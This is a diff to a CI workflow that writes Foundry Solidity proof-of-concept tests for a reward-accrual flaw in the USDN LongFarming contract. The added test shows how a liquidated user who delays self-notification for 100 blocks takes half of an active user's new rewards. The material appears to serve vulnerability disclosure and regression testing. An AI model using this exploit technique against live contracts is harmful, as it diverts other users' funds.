@@ -12,7 +12,7 @@ jobs:
       - uses: foundry-rs/foundry-toolchain@v1
         with:
           version: stable
-      - name: Clone upstream LongFarming and add regression PoC
+      - name: Clone upstream LongFarming and add regression PoCs
         shell: bash
         run: |
           set -euo pipefail
@@ -27,11 +27,10 @@ jobs:
           pragma solidity ^0.8.26;
 
           import { IUsdnProtocolTypes } from "@smardex-usdn-contracts/interfaces/UsdnProtocol/IUsdnProtocolTypes.sol";
-          import { USER_1 } from "../../utils/Constants.sol";
+          import { USER_1, USER_2 } from "../../utils/Constants.sol";
           import { UsdnLongFarmingBaseFixture } from "./utils/Fixtures.sol";
 
-          /// @notice Security regression PoC: a position that is already liquidated in USDN
-          /// continues to accrue FarmingRange rewards until someone explicitly notifies LongFarming.
+          /// @notice A liquidated position keeps accruing rewards until somebody explicitly notifies LongFarming.
           contract TestPostLiquidationRewards is UsdnLongFarmingBaseFixture {
               IUsdnProtocolTypes.Position internal position;
               int24 internal constant TICK = 1234;
@@ -54,21 +53,17 @@ jobs:
               }
 
               function test_liquidatedPositionAccruesRewardsForEntireNotificationDelay() public {
-                  // The position becomes liquidated at this block.
                   usdnProtocol.setPosition(position, VERSION, true);
-
                   uint256 pendingAtLiquidation = farming.pendingRewards(TICK, VERSION, INDEX);
 
-                  // LongFarming is not notified for 100 blocks.
                   vm.roll(block.number + 100);
 
                   uint256 pendingAfterDelay = farming.pendingRewards(TICK, VERSION, INDEX);
                   uint256 accruedAfterLiquidation = pendingAfterDelay - pendingAtLiquidation;
                   assertEq(pendingAtLiquidation, 5, "unexpected fixture baseline");
-                  assertEq(pendingAfterDelay, 505, "liquidated position should still be counted for all 100 blocks");
-                  assertEq(accruedAfterLiquidation, 500, "500 rewards were accrued strictly after liquidation");
+                  assertEq(pendingAfterDelay, 505, "liquidated position still counted for all 100 blocks");
+                  assertEq(accruedAfterLiquidation, 500, "500 rewards accrued strictly after liquidation");
 
-                  // A third party finally notifies via harvest(). _updateRewards() runs before _isLiquidated().
                   vm.prank(USER_1);
                   (bool isLiquidated,) = farming.harvest(TICK, VERSION, INDEX);
                   assertTrue(isLiquidated, "position must be recognized as liquidated");
@@ -76,8 +71,7 @@ jobs:
                   uint256 ownerPaid = rewardToken.balanceOf(address(this));
                   uint256 notifierPaid = rewardToken.balanceOf(USER_1);
                   assertEq(ownerPaid + notifierPaid, pendingAfterDelay, "all stale rewards become payable");
-                  assertGt(ownerPaid + notifierPaid, pendingAtLiquidation, "post-liquidation rewards were actually paid");
-                  assertGt(ownerPaid, 0, "former owner receives post-liquidation rewards");
+                  assertGt(ownerPaid + notifierPaid, pendingAtLiquidation, "post-liquidation rewards were paid");
 
                   emit log_named_uint("pending_at_liquidation", pendingAtLiquidation);
                   emit log_named_uint("pending_after_100_block_delay", pendingAfterDelay);
@@ -86,6 +80,107 @@ jobs:
                   emit log_named_uint("notifier_paid", notifierPaid);
               }
           }
+
+          /// @notice Two equal-share positions make the economic harm explicit.
+          /// If the liquidated user delays self-notification for 100 blocks, it steals half of the new rewards
+          /// that should have accrued to the still-active user.
+          contract TestPostLiquidationDilution is UsdnLongFarmingBaseFixture {
+              int24 internal constant LIQ_TICK = 1234;
+              uint256 internal constant LIQ_VERSION = 123;
+              uint256 internal constant LIQ_INDEX = 12;
+
+              int24 internal constant ACTIVE_TICK = 5678;
+              uint256 internal constant ACTIVE_VERSION = 456;
+              uint256 internal constant ACTIVE_INDEX = 34;
+
+              function setUp() public {
+                  _setUp();
+                  _register(USER_1, LIQ_TICK, LIQ_VERSION, LIQ_INDEX);
+                  _register(USER_2, ACTIVE_TICK, ACTIVE_VERSION, ACTIVE_INDEX);
+
+                  // Synchronize the provider first so the liquidation boundary has a clean pre-liquidation baseline.
+                  vm.roll(block.number + 1);
+                  farming.i_updateRewards();
+
+                  // Position 1 is liquidated in USDN; position 2 remains active.
+                  vm.mockCall(
+                      address(usdnProtocol),
+                      abi.encodeWithSignature("getTickVersion(int24)", LIQ_TICK),
+                      abi.encode(LIQ_VERSION + 1)
+                  );
+                  vm.mockCall(
+                      address(usdnProtocol),
+                      abi.encodeWithSignature("getTickVersion(int24)", ACTIVE_TICK),
+                      abi.encode(ACTIVE_VERSION)
+                  );
+              }
+
+              function _register(address owner, int24 tick, uint256 version, uint256 index) internal {
+                  IUsdnProtocolTypes.Position memory p = IUsdnProtocolTypes.Position({
+                      validated: true,
+                      timestamp: uint40(block.timestamp),
+                      user: owner,
+                      totalExpo: 20,
+                      amount: 10
+                  });
+                  usdnProtocol.setPosition(p, version, false);
+                  usdnProtocol.transferPositionOwnership(
+                      IUsdnProtocolTypes.PositionId(tick, version, index), address(farming), ""
+                  );
+              }
+
+              function test_delayedSelfNotificationStealsHalfOfActiveUsersNewYield() public {
+                  uint256 attackerAtLiquidation = farming.pendingRewards(LIQ_TICK, LIQ_VERSION, LIQ_INDEX);
+                  uint256 honestAtLiquidation = farming.pendingRewards(ACTIVE_TICK, ACTIVE_VERSION, ACTIVE_INDEX);
+                  assertEq(attackerAtLiquidation, 5, "attacker pre-liquidation baseline");
+                  assertEq(honestAtLiquidation, 5, "honest pre-liquidation baseline");
+
+                  // Attacker deliberately leaves the already-liquidated position registered for 100 blocks.
+                  vm.roll(block.number + 100);
+
+                  uint256 attackerBeforeSlash = farming.pendingRewards(LIQ_TICK, LIQ_VERSION, LIQ_INDEX);
+                  uint256 honestBeforeSlash = farming.pendingRewards(ACTIVE_TICK, ACTIVE_VERSION, ACTIVE_INDEX);
+                  assertEq(attackerBeforeSlash, 255, "stale liquidated position gets half of all new rewards");
+                  assertEq(honestBeforeSlash, 255, "active user gets only half of all new rewards");
+
+                  // Former owner self-notifies. Because owner == notifier, it receives 100% of its stale allocation.
+                  vm.prank(USER_1);
+                  (bool liquidated,) = farming.harvest(LIQ_TICK, LIQ_VERSION, LIQ_INDEX);
+                  assertTrue(liquidated);
+                  assertEq(rewardToken.balanceOf(USER_1), 255, "attacker cashes out stale allocation");
+
+                  vm.prank(USER_2);
+                  farming.harvest(ACTIVE_TICK, ACTIVE_VERSION, ACTIVE_INDEX);
+                  assertEq(rewardToken.balanceOf(USER_2), 255, "honest user receives diluted yield");
+
+                  // With immediate removal, the active user gets its 5-token baseline plus all 500 future rewards.
+                  uint256 honestCounterfactual = 505;
+                  uint256 stolenFromHonest = honestCounterfactual - rewardToken.balanceOf(USER_2);
+                  uint256 attackerPostLiquidationGain = rewardToken.balanceOf(USER_1) - attackerAtLiquidation;
+                  assertEq(stolenFromHonest, 250, "250 rewards stolen from active user");
+                  assertEq(attackerPostLiquidationGain, 250, "attacker gains the same 250 post-liquidation rewards");
+
+                  emit log_named_uint("honest_counterfactual_if_removed_immediately", honestCounterfactual);
+                  emit log_named_uint("honest_actual_with_100_block_delay", rewardToken.balanceOf(USER_2));
+                  emit log_named_uint("stolen_from_honest", stolenFromHonest);
+                  emit log_named_uint("attacker_post_liquidation_gain", attackerPostLiquidationGain);
+              }
+
+              function test_immediateNotificationLeavesAllFutureYieldToActiveUser() public {
+                  vm.prank(USER_1);
+                  (bool liquidated,) = farming.harvest(LIQ_TICK, LIQ_VERSION, LIQ_INDEX);
+                  assertTrue(liquidated);
+                  assertEq(rewardToken.balanceOf(USER_1), 5, "only pre-liquidation yield goes to former owner");
+
+                  vm.roll(block.number + 100);
+                  vm.prank(USER_2);
+                  farming.harvest(ACTIVE_TICK, ACTIVE_VERSION, ACTIVE_INDEX);
+                  assertEq(rewardToken.balanceOf(USER_2), 505, "active user receives all 500 future rewards");
+
+                  emit log_named_uint("former_owner_with_immediate_notification", rewardToken.balanceOf(USER_1));
+                  emit log_named_uint("active_user_with_immediate_notification", rewardToken.balanceOf(USER_2));
+              }
+          }
           SOL
 
-          forge test --match-contract TestPostLiquidationRewards -vvvv
+          forge test --match-path 'test/unit/UsdnLongFarming/PostLiquidationRewards.t.sol' -vvvv
